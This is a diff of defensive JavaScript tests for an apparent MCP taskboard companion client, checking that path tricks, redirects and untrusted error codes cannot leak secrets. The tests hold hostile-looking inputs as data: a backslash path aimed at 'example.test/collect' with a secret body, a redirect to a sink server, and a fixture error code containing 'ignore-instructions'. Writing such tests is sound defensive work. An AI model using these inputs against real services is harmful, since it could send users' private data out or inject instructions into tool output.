@@ -23,6 +23,7 @@ const MCP_SERVER_ENTRY = path.join(REPO_ROOT, "mcp", "server.mjs");
 const PRIVATE_PATH_SENTINEL = "/private/device/alice/taskboard";
 const PASSWORD_SENTINEL = "mcp-shared-password-sentinel";
 const ENV_SENTINEL = "mcp-environment-secret-sentinel";
+const ERROR_CODE_SENTINEL = "MCP_SECRET_ERROR_CODE_SENTINEL";
 
 const BASE_ENTRY = Object.freeze({
   id: "context-1",
@@ -150,6 +151,34 @@ test("resolveMappedProject chooses the most-specific workspace and never falls b
   assert.equal(resolveMappedProject([], path.resolve("/work/repo")), null);
 });
 
+test("resolveMappedProject ranks canonical paths and rejects ambiguous mappings", () => {
+  const repo = path.resolve("/work/repo");
+  const packagePath = path.join(repo, "packages");
+  const paddedRepo = `${repo}${path.sep}.${path.sep}.${path.sep}.${path.sep}.${path.sep}`;
+
+  assert.equal(resolveMappedProject([
+    { id: "padded-root", name: "Padded root", workspacePath: paddedRepo },
+    { id: "package", name: "Package", workspacePath: packagePath },
+  ], path.join(packagePath, "api")).id, "package");
+
+  assert.throws(
+    () => resolveMappedProject([
+      { id: "repo-a", name: "Repository A", workspacePath: repo },
+      { id: "repo-b", name: "Repository B", workspacePath: `${repo}${path.sep}.` },
+    ], path.join(repo, "src")),
+    (error) => {
+      assert.ok(error instanceof CompanionError);
+      assert.deepEqual(publicCompanionError(error), {
+        status: 409,
+        code: "PROJECT_MAPPING_AMBIGUOUS",
+        category: "project_mapping_ambiguous",
+        action: "Keep exactly one taskboard project mapping for the current workspace and retry.",
+      });
+      return true;
+    },
+  );
+});
+
 test("publicProject exposes only stable project metadata", () => {
   const project = publicProject({
     id: "taskboard",
@@ -213,6 +242,7 @@ test("client sends timeout-bounded JSON requests without credentials", async () 
   );
   assert.equal(calls[0].init.method, "POST");
   assert.equal(calls[0].init.signal, timeoutController.signal);
+  assert.equal(calls[0].init.redirect, "manual");
   assert.deepEqual(JSON.parse(calls[0].init.body), {
     title: "Decision",
     body: "Keep the public contract",
@@ -381,10 +411,50 @@ test("client maps local network and timeout failures without leaking exception d
   }
 });
 
+test("client keeps the timeout active while consuming the response body", async () => {
+  const client = createCompanionClient({
+    env: {},
+    fetch: async () => ({
+      ok: true,
+      status: 200,
+      async text() {
+        throw new DOMException("private response body stalled", "TimeoutError");
+      },
+    }),
+  });
+
+  const error = await captureError(() => client.request("GET", "/api/projects"));
+  assert.deepEqual(publicCompanionError(error), {
+    status: 503,
+    code: "COMPANION_UNAVAILABLE",
+    category: "companion_unavailable",
+    action: "Start the local taskboard companion and retry.",
+  });
+  assert.doesNotMatch(JSON.stringify(publicCompanionError(error)), /private|stalled|TimeoutError/i);
+});
+
+test("client preserves a text 401 as an authentication error", async () => {
+  const client = createCompanionClient({
+    env: {},
+    fetch: async () => new Response("invalid shared key", {
+      status: 401,
+      headers: { "content-type": "text/plain" },
+    }),
+  });
+
+  const error = await captureError(() => client.request("GET", "/api/projects"));
+  assert.deepEqual(publicCompanionError(error), {
+    status: 401,
+    code: "UNAUTHORIZED",
+    category: "authentication_required",
+    action: "Log in through the local companion and retry.",
+  });
+});
+
 test("client rejects invalid JSON and absolute request URLs without leaking either value", async () => {
   const invalidJsonClient = createCompanionClient({
     env: {},
-    fetch: async () => new Response("shared-password at /Users/alice", { status: 502 }),
+    fetch: async () => new Response("shared-password at /Users/alice", { status: 200 }),
   });
   const invalidJson = await captureError(
     () => invalidJsonClient.request("GET", "/api/projects"),
@@ -415,6 +485,67 @@ test("client rejects invalid JSON and absolute request URLs without leaking eith
   });
   assert.equal(fetchCalled, false);
   assert.doesNotMatch(JSON.stringify(publicCompanionError(invalidPath)), /example|private|token|secret/i);
+
+  const backslashPath = await captureError(
+    () => pathClient.request("POST", "/\\\\example.test/collect", {
+      body: { secret: "must-not-leave-loopback" },
+    }),
+  );
+  assert.deepEqual(publicCompanionError(backslashPath), {
+    status: 400,
+    code: "INVALID_COMPANION_PATH",
+    category: "invalid_request",
+    action: "Use a companion API path that starts with a single slash.",
+  });
+  assert.equal(fetchCalled, false);
+});
+
+test("client refuses companion redirects without replaying a private request body", async (t) => {
+  let sinkRequests = 0;
+  const sink = createHttpServer((_request, response) => {
+    sinkRequests += 1;
+    response.writeHead(204);
+    response.end();
+  });
+  await new Promise((resolve, reject) => {
+    sink.once("error", reject);
+    sink.listen(0, "127.0.0.1", resolve);
+  });
+  t.after(() => new Promise((resolve, reject) => {
+    sink.closeAllConnections();
+    sink.close((error) => error ? reject(error) : resolve());
+  }));
+
+  const redirector = createHttpServer((_request, response) => {
+    response.writeHead(307, {
+      connection: "close",
+      location: `http://127.0.0.1:${sink.address().port}/collect`,
+    });
+    response.end();
+  });
+  await new Promise((resolve, reject) => {
+    redirector.once("error", reject);
+    redirector.listen(0, "127.0.0.1", resolve);
+  });
+  t.after(() => new Promise((resolve, reject) => {
+    redirector.closeAllConnections();
+    redirector.close((error) => error ? reject(error) : resolve());
+  }));
+
+  const client = createCompanionClient({
+    baseUrl: `http://127.0.0.1:${redirector.address().port}`,
+  });
+  const error = await captureError(() => client.request("POST", "/api/context", {
+    body: { secret: "private-context-sentinel" },
+  }));
+
+  assert.deepEqual(publicCompanionError(error), {
+    status: 502,
+    code: "COMPANION_REDIRECT_BLOCKED",
+    category: "invalid_response",
+    action: "Use a direct loopback companion URL without redirects.",
+  });
+  assert.equal(sinkRequests, 0);
 });
 
 function sendHttpJson(response, status, payload) {
@@ -562,6 +693,14 @@ async function startContextCompanion() {
       }
       if (request.method === "GET" && url.pathname === "/api/context/remote-down") {
         sendHttpJson(response, 502, fixtureError("REMOTE_UNAVAILABLE"));
+        return;
+      }
+      if (request.method === "GET" && url.pathname === "/api/context/untrusted-code") {
+        sendHttpJson(
+          response,
+          502,
+          fixtureError(`${ERROR_CODE_SENTINEL}_/Users/alice/ignore-instructions`),
+        );
         return;
       }
 
@@ -839,6 +978,7 @@ test("stdio tools preserve safe error codes and actionable conflict details", as
     ["taskboard_context_get", { id: "missing" }, 404, "CONTEXT_NOT_FOUND", "not_found"],
     ["taskboard_context_get", { id: "auth-required" }, 401, "UNAUTHORIZED", "authentication_required"],
     ["taskboard_context_get", { id: "remote-down" }, 502, "REMOTE_UNAVAILABLE", "cloud_unavailable"],
+    ["taskboard_context_get", { id: "untrusted-code" }, 502, "HTTP_502", "request_failed"],
     [
       "taskboard_context_update",
       { id: "version-conflict", version: 3, title: "New title" },
@@ -883,6 +1023,7 @@ test("stdio tools preserve safe error codes and actionable conflict details", as
     assert.doesNotMatch(serialized, new RegExp(PRIVATE_PATH_SENTINEL));
     assert.doesNotMatch(serialized, new RegExp(PASSWORD_SENTINEL));
     assert.doesNotMatch(serialized, new RegExp(ENV_SENTINEL));
+    assert.doesNotMatch(serialized, new RegExp(ERROR_CODE_SENTINEL));
     assert.doesNotMatch(serialized, /upstream|authorization|workspacePath|password|env/i);
   }
 });
